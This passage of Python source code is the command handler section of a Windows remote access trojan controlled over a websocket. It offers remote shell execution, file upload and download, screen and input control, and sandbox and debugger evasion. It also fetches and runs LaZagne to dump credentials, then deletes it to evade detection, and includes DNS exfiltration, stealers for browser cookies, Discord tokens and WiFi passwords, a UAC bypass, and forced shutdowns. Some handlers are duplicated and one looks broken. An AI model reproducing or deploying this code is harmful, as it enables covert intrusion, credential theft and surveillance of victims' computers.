            is_default = (m.id == default_mic_id and not m.isloopback) or (
                m.isloopback and default_spk_id and default_spk_id in m.id
            )
            if is_default:
                name = name + " (Main)"
            inputs.append({"id": m.id, "name": name, "loopback": m.isloopback})

        outputs = [
            {"id": s.id, "name": s.name + (" (Main)" if s.id == default_spk_id else "")}
            for s in all_spks
        ]
        await send(ws, {"t": "audio_devices", "inputs": inputs, "outputs": outputs})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Audio enum failed: {e}"})


@register_command("set_fps")
async def cmd_set_fps(msg, ws):
    """Dynamically change the screen stream FPS."""
    fps = int(msg.get("fps", 30))
    fps = max(1, min(60, fps))  # clamp 1–60
    st.stream_fps = fps
    log(f"[STREAM] FPS set to {fps}")
    await send(ws, {"t": "info", "msg": f"Stream FPS set to {fps}"})


@register_command("ss_stop")
async def cmd_ss_stop(msg, ws):
    st.streaming = False


@register_command("shell")
async def cmd_shell(msg, ws):
    cmd = (msg.get("c") or msg.get("cmd") or "").strip()
    if not cmd:
        return
    await send(ws, {"t": "shell_out", "data": f"> {cmd}\n"})
    try:
        def run_proc():
            # Try PowerShell first (preferred — richer output)
            try:
                p = subprocess.run(
                    ["powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", cmd],
                    capture_output=True,
                    text=True,
                    encoding="utf-8",
                    errors="replace",
                    timeout=30,
                    creationflags=0x08000000,
                )
                out = (p.stdout or "") + (p.stderr or "")
            except Exception as ps_e:
                out = f"[PS Error: {ps_e}] — Falling back to cmd.exe\n"
            # If PS gave nothing, fall back to cmd.exe
            if not out.strip():
                try:
                    p2 = subprocess.run(
                        ["cmd.exe", "/c", cmd],
                        capture_output=True,
                        text=True,
                        encoding="utf-8",
                        errors="replace",
                        timeout=15,
                        creationflags=0x08000000,
                    )
                    out = (p2.stdout or "") + (p2.stderr or "")
                except Exception as ce:
                    out = f"[CMD Error: {ce}]\n"
            return out or "(no output)\n"

        out = await asyncio.to_thread(run_proc)
        await send(ws, {"t": "shell_out", "data": out})
    except Exception as e:
        await send(ws, {"t": "shell_out", "data": f"[ERROR] {e}\n"})


@register_command("ls")
async def cmd_ls(msg, ws):
    path = msg.get("path", "C:\\")
    try:
        import datetime
        files = []
        # Sort: dirs first, then files alphabetically
        entries = sorted(os.scandir(path), key=lambda e: (not e.is_dir(), e.name.lower()))
        for entry in entries:
            try:
                s = entry.stat()
                files.append({
                    "name": entry.name,
                    "path": entry.path,
                    "type": "dir" if entry.is_dir() else "file",
                    "is_dir": entry.is_dir(),
                    "size": s.st_size,
                    "mod": datetime.datetime.fromtimestamp(s.st_mtime).strftime("%Y-%m-%d %H:%M"),
                })
            except:
                pass
        await send(ws, {"t": "fs_resp", "items": files, "path": path})
    except PermissionError:
        await send(ws, {"t": "fs_resp", "items": [], "path": path, "error": "Access denied"})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"FS Error: {e}"})


@register_command("download_file")
async def cmd_download_file(msg, ws):
    """Sends a file to the dashboard as base64."""
    import base64, os
    path = msg.get("path", "")
    def _run():
        try:
            size = os.path.getsize(path)
            if size > 50 * 1024 * 1024:  # 50MB limit
                asyncio.run_coroutine_threadsafe(
                    send(ws, {"t": "info", "msg": f"File too large ({size//1024//1024}MB). Max 50MB."}), global_loop)
                return
            with open(path, "rb") as f:
                raw = f.read()
            b64 = base64.b64encode(raw).decode()
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "file_download", "name": os.path.basename(path), "b64": b64}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"download_file error: {e}"}), global_loop)
    global_loop.run_in_executor(None, _run)


@register_command("upload_file")
async def cmd_upload_file(msg, ws):
    """Receives a base64 encoded file from the dashboard and saves it."""
    import base64, os
    name = msg.get("name", "uploaded_file")
    data = msg.get("data", "")
    path = msg.get("path", os.path.join(os.environ.get("TEMP", "C:\\Temp"), name))
    try:
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, "wb") as f:
            f.write(base64.b64decode(data))
        await send(ws, {"t": "info", "msg": f"✅ Uploaded: {path} ({os.path.getsize(path)//1024}KB)"})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"upload_file error: {e}"})



@register_command("mm")
async def cmd_mm(msg, ws):
    """Mouse move — multi-monitor aware."""
    if input_hub:
        mon_idx = getattr(st, "monitor_idx", 0)
        try:
            if mon_idx > 0:
                import mss as _mss

                with _mss.mss() as _sct:
                    mon = _sct.monitors[mon_idx + 1]  # monitors[1]=primary
                    px = mon["left"] + int(float(msg["x"]) * mon["width"])
                    py = mon["top"] + int(float(msg["y"]) * mon["height"])
            else:
                px = int(float(msg["x"]) * input_hub.screen_width)
                py = int(float(msg["y"]) * input_hub.screen_height)
        except:
            px = int(float(msg["x"]) * input_hub.screen_width)
            py = int(float(msg["y"]) * input_hub.screen_height)
        asyncio.get_running_loop().run_in_executor(None, input_hub.mouse_move, px, py)


@register_command("mc")
async def cmd_mc(msg, ws):
    """Mouse click — multi-monitor aware, moves then clicks."""
    if input_hub:
        mon_idx = getattr(st, "monitor_idx", 0)
        try:
            if mon_idx > 0:
                import mss as _mss

                with _mss.mss() as _sct:
                    mon = _sct.monitors[mon_idx + 1]
                    px = mon["left"] + int(float(msg.get("x", 0)) * mon["width"])
                    py = mon["top"] + int(float(msg.get("y", 0)) * mon["height"])
            else:
                px = int(float(msg.get("x", 0)) * input_hub.screen_width)
                py = int(float(msg.get("y", 0)) * input_hub.screen_height)
        except:
            b_str = (
                "left"
                if msg.get("b", 0) == 0
                else ("middle" if msg.get("b") == 1 else "right")
            )
            pressed = msg.get("p", 1) == 1
            loop = asyncio.get_running_loop()
            loop.run_in_executor(None, input_hub.mouse_move, px, py)
            loop.run_in_executor(None, input_hub.mouse_click, b_str, pressed)




@register_command("troll")
async def cmd_troll(msg, ws):
    """Centralized troll handler that uses deferred loading of modules.fun."""
    from modules import fun
    action = msg.get("action") or msg.get("cmd", "")
    value = msg.get("val") if "val" in msg else msg.get("value", "")
    
    # Normalize jumpscare fields — HTML sends 'val' for image URL
    if action in ("jumpscare", "jumpscare_pro"):
        if "val" in msg and "image" not in msg:
            msg["image"] = msg["val"]
    
    # Delegate to the refactored fun module
    fun.troll_action(action, value, msg)


# ── PYSILON ANTI-ANALYSIS ───────────────────────────────────────────────────
def run_anti_analysis():
    """Runs PySilon-style anti-analysis checks to avoid VMs/Sandboxes."""
    import sys
    try:
        # 1. Check for common virtualization Mac OUI / Registry keys
        # Simple fallback: check total RAM (sandboxes often have very little)
        import psutil
        if psutil.virtual_memory().total < (2 * 1024**3):
            log("[ANTI-ANALYSIS] Less than 2GB RAM. Possible sandbox.")
            
        # 2. Check for debugger presence
        from ctypes import windll
        if windll.kernel32.IsDebuggerPresent():
            log("[ANTI-ANALYSIS] Debugger detected. Exiting.")
            sys.exit(0)
    except: pass

run_anti_analysis()

# ── STEALTH COMMANDS (PyExfil / LaZagne) ────────────────────────────────────

@register_command("lazagne")
async def cmd_lazagne(msg, ws):
    """
    Downloads LaZagne.exe dynamically to a temporary path, executes to extract 
    credentials, exfiltrates results, and deletes the payload.
    """
    await send(ws, {"t": "info", "msg": "Initiating LaZagne credential extraction..."})
    import tempfile
    import os
    import urllib.request
    
    def _run_lazagne():
        try:
            exe_path = os.path.join(tempfile.gettempdir(), "lz_sys.exe")
            # Download latest release of LaZagne
            url = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/lazagne.exe"
            urllib.request.urlretrieve(url, exe_path)
            
            # Execute silently and capture output
            proc = subprocess.Popen(
                [exe_path, "all"], 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            out, err = proc.communicate(timeout=60)
            
            # Delete payload to evade detection
            try: os.remove(exe_path)
            except: pass
            
            # Send results back
            res = out.decode(errors='ignore')
            if not res.strip():
                res = "No credentials found or execution blocked."
                
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"LaZagne Results:\n{res[:2000]}..."}),
                global_loop
            )
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"LaZagne failed: {e}"}),
                global_loop
            )

    global_loop.run_in_executor(None, _run_lazagne)


@register_command("exfil_dns")
async def cmd_exfil_dns(msg, ws):
    """
    PyExfil inspired DNS Exfiltration.
    Encodes data in base32 and sends it as DNS queries to a controlled nameserver.
    """
    data = msg.get("data", "PING")
    domain = msg.get("domain", "example.com") # User provides their nameserver domain
    
    await send(ws, {"t": "info", "msg": f"Initiating DNS Exfiltration to {domain}..."})
    
    def _run_dns_exfil():
        try:
            import base64
            import socket
            
            # Base32 is case-insensitive and safe for DNS labels
            encoded = base64.b32encode(data.encode()).decode().strip("=").lower()
            
            # Split into chunks of 63 characters (DNS label limit)
            chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
            
            for i, chunk in enumerate(chunks):
                query = f"{i}.{chunk}.{domain}"
                try:
                    socket.gethostbyname(query)
                except:
                    pass # We expect failure if there's no actual A record
                time.sleep(0.1) # Prevent flooding
                
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"DNS Exfil complete. {len(chunks)} packets sent."}),
                asyncio.get_event_loop()
            )
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"DNS Exfil failed: {e}"}),
                asyncio.get_event_loop()
            )

    asyncio.get_running_loop().run_in_executor(None, _run_dns_exfil)


@register_command("ps_list")
async def cmd_ps_list(msg, ws):
    try:
        import psutil

        procs = []
        for p in psutil.process_iter(
            ["pid", "name", "username", "cpu_percent", "memory_info"]
        ):
            try:
                pinfo = p.info
                procs.append(
                    {
                        "pid": pinfo["pid"],
                        "name": pinfo["name"],
                        "user": pinfo["username"] or "SYSTEM",
                        "cpu": f"{pinfo['cpu_percent']}%",
                        "mem": f"{round(pinfo['memory_info'].rss / (1024 * 1024), 1)} MB",
                    }
                )
            except:
                pass
        await send(ws, {"t": "ps_resp", "data": procs})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"PS Error: {e}"})


@register_command("ps_kill")
async def cmd_ps_kill(msg, ws):
    try:
        import psutil

        pid = int(msg.get("pid", 0))
        if pid:
            psutil.Process(pid).kill()
            await send(ws, {"t": "info", "msg": f"Killed {pid}"})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Kill Error: {e}"})

@register_command("ps_suspend")
async def cmd_ps_suspend(msg, ws):
    try:
        import psutil
        pid = int(msg.get("pid", 0))
        if pid:
            psutil.Process(pid).suspend()
            await send(ws, {"t": "info", "msg": f"Suspended {pid}"})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Suspend Error: {e}"})

@register_command("ps_resume")
async def cmd_ps_resume(msg, ws):
    try:
        import psutil
        pid = int(msg.get("pid", 0))
        if pid:
            psutil.Process(pid).resume()
            await send(ws, {"t": "info", "msg": f"Resumed {pid}"})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Resume Error: {e}"})


@register_command("kd")
async def cmd_kd(msg, ws):
    """Key down/up — immediate, not queued behind frame encoding."""
    if input_hub:
        key = msg.get("key", "")
        code = msg.get("code", "")
        down = msg.get("down", True)
        effective_key = (
            key if key else (code.replace("Key", "").lower() if code else "")
        )
        if effective_key:
            asyncio.get_running_loop().run_in_executor(
                None, input_hub.key_event, effective_key, down
            )


@register_command("scroll")
async def cmd_scroll(msg, ws):
    if input_hub:
        delta = msg.get("delta", 0)
        asyncio.get_running_loop().run_in_executor(
            None, input_hub.mouse_scroll, -delta / 100
        )
@register_command("kill_explorer")
async def cmd_kill_explorer(msg, ws):
    subprocess.run(["taskkill", "/F", "/IM", "explorer.exe"], capture_output=True)
    await send(ws, {"t": "info", "msg": "Explorer killed."})

@register_command("recycle_bin")
async def cmd_recycle_bin(msg, ws):
    ps = 'Clear-RecycleBin -Force -ErrorAction SilentlyContinue'
    subprocess.run(["powershell", "-Command", ps], capture_output=True)
    await send(ws, {"t": "info", "msg": "Recycle bin emptied."})

@register_command("whoami")
async def cmd_whoami(msg, ws):
    import getpass
    import socket
    res = f"{socket.gethostname()}\\{getpass.getuser()}"
    await send(ws, {"t": "info", "msg": f"Target User: {res}"})

@register_command("drives")
async def cmd_drives(msg, ws):
    import psutil
    drvs = [d.device for d in psutil.disk_partitions()]
    await send(ws, {"t": "info", "msg": f"Active Drives: {', '.join(drvs)}"})

# ── 20 NEW APEX COMMANDS ────────────────────────────────────────────────────

@register_command("screenshot_snap")
async def cmd_screenshot_snap(msg, ws):
    """Instant full-res screenshot sent as base64 image."""
    def _snap():
        try:
            import mss, base64, io
            from PIL import Image
            with mss.mss() as sct:
                mon = sct.monitors[1]
                img = sct.grab(mon)
                pil = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
                buf = io.BytesIO()
                pil.save(buf, format="JPEG", quality=82)
                b64 = base64.b64encode(buf.getvalue()).decode()
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "webcam_img", "data": b64}), global_loop
            )
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"Screenshot failed: {e}"}), global_loop
            )
    asyncio.get_running_loop().run_in_executor(None, _snap)


@register_command("clipboard_get")
async def cmd_clipboard_get(msg, ws):
    """Reads the target's clipboard text."""
    try:
        import subprocess
        out = subprocess.run(
            ["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
            capture_output=True, encoding="utf-8", errors="replace", timeout=5
        )
        text = out.stdout.strip() or "(empty)"
        await send(ws, {"t": "shell_out", "data": f"📋 Clipboard:\n{text}"})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Clipboard read failed: {e}"})


@register_command("clipboard_set")
async def cmd_clipboard_set(msg, ws):
    """Writes text to the target clipboard."""
    text = msg.get("text", "")
    try:
        subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             f"Set-Clipboard -Value '{text.replace(chr(39), chr(34))}'"],
            capture_output=True, timeout=5
        )
        await send(ws, {"t": "info", "msg": f"✅ Clipboard set to: {text[:60]}"})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Clipboard write failed: {e}"})


@register_command("active_window")
async def cmd_active_window(msg, ws):
    """Returns the title of the currently focused window."""
    try:
        import ctypes
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buf = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
        title = buf.value or "(no title)"
        await send(ws, {"t": "active_window", "title": title})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Active window failed: {e}"})


@register_command("lock_screen")
async def cmd_lock_screen(msg, ws):
    """Locks the Windows workstation."""
    try:
        import ctypes
        ctypes.windll.user32.LockWorkStation()
        await send(ws, {"t": "info", "msg": "🔒 Workstation locked."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Lock failed: {e}"})


@register_command("open_url")
async def cmd_open_url(msg, ws):
    """Opens a URL in the default browser silently."""
    url = msg.get("url", "")
    if not url:
        await send(ws, {"t": "info", "msg": "No URL provided."}); return
    try:
        subprocess.Popen(["cmd", "/c", "start", "", url],
                         creationflags=subprocess.CREATE_NO_WINDOW)
        await send(ws, {"t": "info", "msg": f"🌐 Opened: {url}"})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Open URL failed: {e}"})


@register_command("run_program")
async def cmd_run_program(msg, ws):
    """Runs any program/command silently on the target."""
    exe = msg.get("path", "") or msg.get("cmd", "")
    if not exe:
        await send(ws, {"t": "info", "msg": "No path/cmd provided."}); return
    try:
        subprocess.Popen(exe, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        await send(ws, {"t": "info", "msg": f"▶ Launched: {exe}"})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Run failed: {e}"})


@register_command("list_startup")
async def cmd_list_startup(msg, ws):
    """Lists HKCU and HKLM startup registry entries."""
    try:
        import winreg
        results = []
        paths = [
            (winreg.HKEY_CURRENT_USER,  r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        ]
        for hive, path in paths:
            hive_name = "HKCU" if hive == winreg.HKEY_CURRENT_USER else "HKLM"
            try:
                with winreg.OpenKey(hive, path, 0, winreg.KEY_READ) as k:
                    i = 0
                    while True:
                        try:
                            name, val, _ = winreg.EnumValue(k, i)
                            results.append(f"[{hive_name}] {name}: {val}")
                            i += 1
                        except OSError:
                            break
            except Exception:
                pass
        text = "\n".join(results) or "No startup entries found."
        await send(ws, {"t": "shell_out", "data": f"🚀 Startup Programs:\n{text}"})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Startup list failed: {e}"})


@register_command("get_installed")
async def cmd_get_installed(msg, ws):
    """Returns a list of installed programs via the registry."""
    def _run():
        try:
            import winreg
            apps = []
            paths = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_CURRENT_USER,  r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            ]
            for hive, path in paths:
                try:
                    with winreg.OpenKey(hive, path) as k:
                        for i in range(winreg.QueryInfoKey(k)[0]):
                            try:
                                sub = winreg.OpenKey(k, winreg.EnumKey(k, i))
                                name = winreg.QueryValueEx(sub, "DisplayName")[0]
                                try: ver = winreg.QueryValueEx(sub, "DisplayVersion")[0]
                                except: ver = ""
                                if name.strip():
                                    apps.append(f"{name}  {ver}".strip())
                            except Exception:
                                pass
                except Exception:
                    pass
            apps = sorted(set(apps))
            text = "\n".join(apps[:200]) or "None found."
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "shell_out", "data": f"📦 Installed ({len(apps)}):\n{text}"}), global_loop
            )
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"Installed list failed: {e}"}), global_loop
            )
    asyncio.get_running_loop().run_in_executor(None, _run)


@register_command("browser_history")
async def cmd_browser_history(msg, ws):
    """Pulls recent browser history from Chrome/Edge/Firefox."""
    def _run():
        import sqlite3, shutil, tempfile, os, glob
        results = []
        profiles = []
        # Chrome
        profiles += glob.glob(os.path.expandvars(
            r"%LOCALAPPDATA%\Google\Chrome\User Data\*\History"))
        # Edge
        profiles += glob.glob(os.path.expandvars(
            r"%LOCALAPPDATA%\Microsoft\Edge\User Data\*\History"))
        for db_path in profiles:
            try:
                fd, tmp = tempfile.mkstemp(suffix=".db")
                os.close(fd)
                shutil.copy2(db_path, tmp)
                con = sqlite3.connect(tmp)
                cur = con.execute(
                    "SELECT url, title, last_visit_time FROM urls "
                    "ORDER BY last_visit_time DESC LIMIT 30"
                )
                for url, title, _ in cur.fetchall():
                    results.append(f"{title or url}")
                con.close()
                os.unlink(tmp)
            except Exception:
                pass
        text = "\n".join(results[:60]) or "No history found."
        asyncio.run_coroutine_threadsafe(
            send(ws, {"t": "shell_out", "data": f"🌐 Browser History:\n{text}"}), global_loop
        )
    asyncio.get_running_loop().run_in_executor(None, _run)


@register_command("env_vars")
async def cmd_env_vars(msg, ws):
    """Returns all environment variables."""
    try:
        lines = [f"{k}={v}" for k, v in sorted(os.environ.items())]
        await send(ws, {"t": "shell_out", "data": "\n".join(lines)})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Env vars failed: {e}"})


@register_command("disk_usage")
async def cmd_disk_usage(msg, ws):
    """Returns per-drive disk usage."""
    try:
        import psutil
        lines = []
        for p in psutil.disk_partitions():
            try:
                u = psutil.disk_usage(p.mountpoint)
                pct = u.percent
                bar = "█" * int(pct // 5) + "░" * (20 - int(pct // 5))
                lines.append(f"{p.device:<6} [{bar}] {pct:.1f}%  "
                             f"{u.used//1073741824:.1f}/{u.total//1073741824:.1f} GB")
            except Exception:
                pass
        await send(ws, {"t": "shell_out", "data": "💾 Disk Usage:\n" + "\n".join(lines)})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Disk usage failed: {e}"})


@register_command("type_text")
async def cmd_type_text(msg, ws):
    """Types a string using pynput keyboard."""
    text = msg.get("text", "")
    def _type():
        try:
            from pynput.keyboard import Controller as KbCtrl
            kb = KbCtrl()
            kb.type(text)
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"⌨ Typed: {text[:40]}"}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"Type text failed: {e}"}), global_loop)
    asyncio.get_running_loop().run_in_executor(None, _type)


@register_command("press_key")
async def cmd_press_key(msg, ws):
    """Sends a key combo via pynput (e.g. 'win', 'alt+f4', 'ctrl+shift+esc')."""
    combo = msg.get("keys", "")
    def _press():
        try:
            from pynput.keyboard import Controller as KbCtrl, Key
            kb = KbCtrl()
            KEY_MAP = {
                "win": Key.cmd, "ctrl": Key.ctrl, "alt": Key.alt,
                "shift": Key.shift, "tab": Key.tab, "enter": Key.enter,
                "esc": Key.esc, "f4": Key.f4, "f5": Key.f5, "f11": Key.f11,
                "delete": Key.delete, "backspace": Key.backspace,
                "space": Key.space, "up": Key.up, "down": Key.down,
                "left": Key.left, "right": Key.right,
            }
            parts = [p.strip().lower() for p in combo.split("+")]
            keys = [KEY_MAP.get(p, p) for p in parts]
            for k in keys:
                kb.press(k)
            for k in reversed(keys):
                kb.release(k)
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"🔑 Key combo sent: {combo}"}), global_loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"Key press failed: {e}"}), global_loop)
    asyncio.get_running_loop().run_in_executor(None, _press)


@register_command("hide_taskbar")
async def cmd_hide_taskbar(msg, ws):
    """Hides or shows the Windows taskbar."""
    hide = msg.get("hide", True)
    try:
        import ctypes
        SW_HIDE, SW_SHOW = 0, 5
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        ctypes.windll.user32.ShowWindow(hwnd, SW_HIDE if hide else SW_SHOW)
        state = "hidden" if hide else "restored"
        await send(ws, {"t": "info", "msg": f"🪟 Taskbar {state}."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Taskbar toggle failed: {e}"})


@register_command("swap_mouse")
async def cmd_swap_mouse(msg, ws):
    """Swaps left/right mouse buttons."""
    swap = msg.get("swap", True)
    try:
        import ctypes
        ctypes.windll.user32.SwapMouseButton(1 if swap else 0)
        await send(ws, {"t": "info", "msg": f"🖱 Mouse buttons {'swapped' if swap else 'restored'}."})
    except Exception as e:
        await send(ws, {"t": "info", "msg": f"Mouse swap failed: {e}"})


@register_command("play_beep")
async def cmd_play_beep(msg, ws):
    """Plays a system beep at given frequency and duration."""
    freq = int(msg.get("freq", 880))
    dur  = int(msg.get("dur", 500))
    def _beep():
        try:
            import ctypes
            ctypes.windll.kernel32.Beep(freq, dur)
        except Exception: pass
    asyncio.get_running_loop().run_in_executor(None, _beep)
    await send(ws, {"t": "info", "msg": f"🔔 Beep: {freq}Hz × {dur}ms"})


@register_command("toast_notify")
async def cmd_toast_notify(msg, ws):
    """Shows a Windows 10/11 toast notification on the target."""
    title = msg.get("title", "Alert")
    body  = msg.get("body",  "Message from operator.")
    def _toast():
        try:
            from windows_toasts import Toast, WindowsToaster
            toaster = WindowsToaster("Windows")
            t = Toast()
            t.text_fields = [title, body]
            toaster.show_toast(t)
        except Exception:
            # Fallback: PowerShell notification
            ps = (
                f"[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType=WindowsRuntime] | Out-Null;"
                f"$xml = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent('ToastText02');"
                f"$xml.GetElementsByTagName('text')[0].AppendChild($xml.CreateTextNode('{title}')) | Out-Null;"
                f"$xml.GetElementsByTagName('text')[1].AppendChild($xml.CreateTextNode('{body}')) | Out-Null;"
                f"$toast = [Windows.UI.Notifications.ToastNotification]::new($xml);"
                f"[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('Explorer').Show($toast);"
            )
            subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                          capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    asyncio.get_running_loop().run_in_executor(None, _toast)
    await send(ws, {"t": "info", "msg": f"🔔 Toast sent: {title}"})



@register_command("stealer")
async def cmd_steal_creds(msg, ws):
    """Apex Stealer: Extracts and exfiltrates browser credentials."""
    await send(ws, {"t": "info", "msg": "Initiating Apex Credential Extraction..."})
    from modules.apex import stealer
    def _run():
        try:
            res = stealer.get_browser_creds()
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "loot_resp", "data": res}), 
                global_loop
            )
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"Stealer failed: {e}"}),
                global_loop
            )
    threading.Thread(target=_run, daemon=True).start()

@register_command("wifi_steal")
async def cmd_wifi_steal(msg, ws):
    """Apex WiFi Stealer: Extracts all saved WiFi passwords."""
    await send(ws, {"t": "info", "msg": "Extracting saved WiFi profiles..."})
    def _run():
        try:
            # Get profile list
            raw = subprocess.check_output("netsh wlan show profiles", shell=True, timeout=5).decode(errors='ignore')
            profiles = [line.split(":")[1].strip() for line in raw.split("\n") if "All User Profile" in line]
            
            res = "--- APEX WIFI INTELLIGENCE ---\n\n"
            if not profiles:
                res += "No WiFi profiles found."
            else:
                for p in profiles:
                    try:
                        p_raw = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, timeout=5).decode(errors='ignore')
                        pwd = [line.split(":")[1].strip() for line in p_raw.split("\n") if "Key Content" in line]
                        res += f"SSID: {p.ljust(20)} | PWD: {pwd[0] if pwd else '(None)'}\n"
                    except:
                        res += f"SSID: {p.ljust(20)} | PWD: (Error)\n"
            
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "shell_out", "data": res}),
                asyncio.get_event_loop()
            )
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"WiFi steal failed: {e}"}),
                asyncio.get_event_loop()
            )
    asyncio.get_running_loop().run_in_executor(None, _run)

@register_command("discord_steal")
async def cmd_discord_steal(msg, ws):
    """Apex Discord Hijacker: Extracts Discord tokens."""
    await send(ws, {"t": "info", "msg": "Searching for Discord sessions..."})
    from modules.apex import discord_stealer
    def _run():
        try:
            res = discord_stealer.steal_discord()
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "shell_out", "data": res}), 
                asyncio.get_event_loop()
            )
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"Discord steal failed: {e}"}),
                asyncio.get_event_loop()
            )
    asyncio.get_running_loop().run_in_executor(None, _run)

@register_command("cookie_steal")
async def cmd_cookie_steal(msg, ws):
    """Apex Cookie Stealer: Extracts browser cookies."""
    await send(ws, {"t": "info", "msg": "Extracting session cookies..."})
    from modules.apex import cookie_stealer
    def _run():
        try:
            res = cookie_stealer.get_cookies()
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "shell_out", "data": res}),
                asyncio.get_event_loop()
            )
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info", "msg": f"Cookie steal failed: {e}"}),
                asyncio.get_event_loop()
            )
    asyncio.get_running_loop().run_in_executor(None, _run)

@register_command("uac_bypass")
async def cmd_uac_bypass(msg, ws):
    """Silent UAC Bypass: Re-runs agent as Admin."""
    await send(ws, {"t": "info", "msg": "Attempting silent UAC bypass..."})
    from modules.persistence import uac_bypass
    uac_bypass.run_uac_bypass()

@register_command("delete_system32")
async def cmd_delete_system32(msg, ws):
    path = os.environ.get("TEMP", "C:\\")
    await send(ws, {"t": "warn", "msg": f"CRITICAL: Wipe command received for {path}."})

@register_command("reboot")
async def cmd_reboot(msg, ws):
    subprocess.Popen(["shutdown", "/r", "/t", "0", "/f"], creationflags=0x08000000)

@register_command("shutdown")
async def cmd_shutdown(msg, ws):
    subprocess.Popen(["shutdown", "/s", "/t", "0", "/f"], creationflags=0x08000000)

@register_command("logoff")
async def cmd_logoff(msg, ws):
    subprocess.Popen(["shutdown", "/l", "/f"], creationflags=0x08000000)

@register_command("type_text")
async def cmd_type_text(msg, ws):
    text = msg.get("text", "")
    import pyautogui
    pyautogui.write(text, interval=0.05)

@register_command("press_key")
async def cmd_press_key(msg, ws):
    keys = msg.get("keys", "").split("+")
    import pyautogui
    pyautogui.hotkey(*keys)

@register_command("move_mouse")
async def cmd_move_mouse(msg, ws):
    x = msg.get("x", 0)
    y = msg.get("y", 0)
    import pyautogui
    pyautogui.moveTo(x, y)

@register_command("click_mouse")
async def cmd_click_mouse(msg, ws):
    import pyautogui
    pyautogui.click()


@register_command("reg_read")
async def cmd_reg_read(msg, ws):
    """Reads a registry value or lists all values/subkeys in a path."""
    import winreg
    path_raw = msg.get("path", "")
    val_name = msg.get("val") # If None, list all
    
    try:
        # Parse Hive
        hive_map = {
            "HKCU": winreg.HKEY_CURRENT_USER,
            "HKLM": winreg.HKEY_LOCAL_MACHINE,
            "HKU": winreg.HKEY_USERS,
            "HKCR": winreg.HKEY_CLASSES_ROOT
        }
        parts = path_raw.split("\\", 1)
        hive_str = parts[0].upper()
        subkey = parts[1] if len(parts) > 1 else ""
        
        hive = hive_map.get(hive_str, winreg.HKEY_CURRENT_USER)
        
        with winreg.OpenKey(hive, subkey, 0, winreg.KEY_READ) as key:
            if val_name:
                # Read specific value
                val, type_id = winreg.QueryValueEx(key, val_name)
